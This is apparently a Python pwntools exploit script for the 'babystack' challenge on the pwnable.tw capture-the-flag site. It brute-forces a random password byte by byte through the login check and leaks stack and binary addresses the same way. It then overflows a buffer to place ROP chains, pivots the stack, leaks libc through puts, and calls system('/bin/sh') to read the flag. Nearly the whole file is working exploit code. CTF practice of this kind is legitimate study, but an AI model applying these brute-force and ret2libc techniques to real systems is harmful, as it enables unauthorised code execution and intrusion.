#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = "amd64"
# context.arch = "i386"
# context.log_level = 'debug'
execve_file = './babystack'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('chall.pwnable.tw', 10205)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0xEBB)
    b *$rebase(0x1052)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

random_buf = ''
for i in range(0x10):
    for ii in range(1, 0x100):
        sh.sendafter('>> ', '1')
        sh.sendlineafter('Your passowrd :', random_buf + chr(ii))

        if(sh.recvline() == 'Login Success !\n'):
            random_buf += chr(ii)
            sh.sendafter('>> ', '1')
            break

print(hexdump(random_buf))

leak_content = '1'

for i in range(6):
    for ii in range(1, 0x100):
        sh.sendafter('>> ', '1')
        sh.sendlineafter('Your passowrd :', random_buf + leak_content + chr(ii))

        if(sh.recvline() == 'Login Success !\n'):
            leak_content += chr(ii)
            sh.sendafter('>> ', '1')
            break

print(hexdump(leak_content))
stack_addr = u64(leak_content.ljust(8, '\0')) & 0xffffffffffffff00
log.success('stack_addr: ' + hex(stack_addr))

sh.sendafter('>> ', '1' + 'a' * 15)
sh.sendafter('Your passowrd :', 'a')


leak_content = ''

for i in range(6):
    for ii in range(1, 0x100):
        sh.sendafter('>> ', '1')
        sh.sendlineafter('Your passowrd :', random_buf + '1' + 'a' * 15 + leak_content + chr(ii))

        if(sh.recvline() == 'Login Success !\n'):
            leak_content += chr(ii)
            sh.sendafter('>> ', '1')
            break

print(hexdump(leak_content))
image_addr = u64(leak_content.ljust(8, '\0')) - 0x1060
log.success('image_addr: ' + hex(image_addr))

# 0x00000000000010c3 : pop rdi ; ret
pop_rdi_ret = 0x00000000000010c3
# 0x00000000000010c1 : pop rsi ; pop r15 ; ret
pop_rsi_r15_ret = 0x00000000000010c1
read_n_addr = 0xCA0
# 0x0000000000000d0d : leave ; ret
leave_ret = 0x0000000000000d0d
Login_addr = 0xDEF


layout1 = [
    stack_addr - 0x100 + 0x80, # rbp

    image_addr + Login_addr,

    image_addr + leave_ret,
]

for i in range(len(layout1))[::-1]:
    sh.sendafter('>> ', '1')
    temp = '\0' + 'b' * 95 + 'cccccccc' * i + p64((layout1[i] << 8) + 1) + '\0'
    sh.sendafter('Your passowrd :', temp[:127])

    sh.sendafter('>> ', '3')
    sh.sendafter('Copy :', 'b')
    sh.sendafter('>> ', '1')

    sh.sendafter('>> ', '1')
    temp = '\0' + 'b' * 63 + random_buf + 'b' * 0x10 + 'cccccccc' * i + p64(layout1[i]) + '\0'
    sh.sendafter('Your passowrd :', temp[:127])

    sh.sendafter('>> ', '3')
    sh.sendafter('Copy :', 'b')
    sh.sendafter('>> ', '1')

sh.sendafter('>> ', '1')
sh.sendafter('Your passowrd :', '\0')

# pause()
sh.sendafter('>> ', '2')

# 0x0000000000000bd0 : pop rbp ; ret
pop_rbp_ret = 0x0000000000000bd0
new_stack1_addr = image_addr + 0x203000 - 0x200

layout2 = [
    image_addr + pop_rdi_ret,
    new_stack1_addr,
    image_addr + pop_rsi_r15_ret,
    0x100,
    0,
    image_addr + read_n_addr,

    image_addr + pop_rbp_ret,
    new_stack1_addr,
    image_addr + leave_ret,
]

# 0x0000000000000aa9 : ret
ret_addr = image_addr + 0x0000000000000aa9

temp = p64(ret_addr) * (16 - len(layout2)) + flat(layout2)
sh.sendafter('Your passowrd :', temp[:127])
# sh.sendafter('Your passowrd :', 'zzzzzzzz' * (16 - len(layout2)) + flat(layout2))
sh.recvline()

new_stack2_addr = image_addr + 0x203000 - 0x100

layout3 = [
    0,
    image_addr + pop_rdi_ret,
    image_addr + elf.got['puts'],
    image_addr + elf.plt['puts'],

    image_addr + pop_rdi_ret,
    new_stack2_addr,
    image_addr + pop_rsi_r15_ret,
    0x100,
    0,
    image_addr + read_n_addr,

    image_addr + pop_rbp_ret,
    new_stack2_addr,
    image_addr + leave_ret,
]

sh.send(flat(layout3))

result = sh.recvline()[:-1]
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['puts']
log.success('libc_addr: ' + hex(libc_addr))

layout4 = [
    0,
    image_addr + pop_rdi_ret,
    libc_addr + libc.search('/bin/sh\0').next(),
    libc_addr + libc.symbols['system'],

    image_addr + pop_rdi_ret,
    0,
    libc_addr + libc.symbols['exit'],
]

sh.send(flat(layout4))

sh.sendline('find /home -name flag | xargs cat')
sh.sendline('cat /home/BabyStack/flag')

sh.interactive()
clear()
